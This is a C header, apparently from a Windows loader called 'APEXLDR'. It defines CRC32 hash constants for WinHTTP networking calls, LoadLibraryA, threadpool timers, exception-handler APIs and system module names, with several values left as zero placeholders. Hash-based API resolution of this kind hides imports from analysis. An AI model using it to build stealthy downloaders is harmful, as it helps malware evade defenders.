#ifndef APEXLDR_HASHER_H
#define APEXLDR_HASHER_H

#include <windows.h>

UINT32 CRC32B(LPCSTR cString);

#define CRCHASH(STR)    ( CRC32B( (LPCSTR)STR ) )

#define WinHttpOpen_CRC32        0x2D697D39
#define WinHttpConnect_CRC32     0x6F50B6C6
#define WinHttpOpenRequest_CRC32         0xB8172A42
#define WinHttpSendRequest_CRC32         0xCEE9B4F7
#define WinHttpReceiveResponse_CRC32     0x46BB61F9
#define WinHttpReadData_CRC32    0x2E5251CA
#define WinHttpCloseHandle_CRC32         0x6A29F9F4
#define GetTickCount64_CRC32     0x517FEF08
#define LoadLibraryA_CRC32       0x3FC1BD8D
#define CreateThreadpoolTimer_CRC32      0xCC315CB0
#define SetThreadpoolTimer_CRC32         0x9B52D1CC
#define WaitForSingleObject_CRC32        0xE058BB45
#define AddVectoredExceptionHandler_CRC32        0x91765761
#define RemoveVectoredExceptionHandler_CRC32     0x8670F6CA

#define HASH_memset     0x00
#define HASH__time64     0x00
#define HASH_printf     0x00
#define HASH_rand       0x00
#define HASH_sprintf    0x00
#define HASH_srand      0x00
#define HASH_memcpy     0x00
#define HASH_memcmp     0x00
#define HASH_strlen     0x00
#define HASH_realloc    0x00
#define HASH_malloc     0x00
#define HASH_wcscat     0x00
#define HASH_wcslen     0x00

#define text_CRC32       0xA21C1EA3

#define kernel32_CRC32   0x6AE69F02

#define winhttp_CRC32    0xF5FAD117

#define ntdll_CRC32      0x84C05E40

#define msvcrtdll_CRC32  0x0
#endif //APEXLDR_HASHER_H
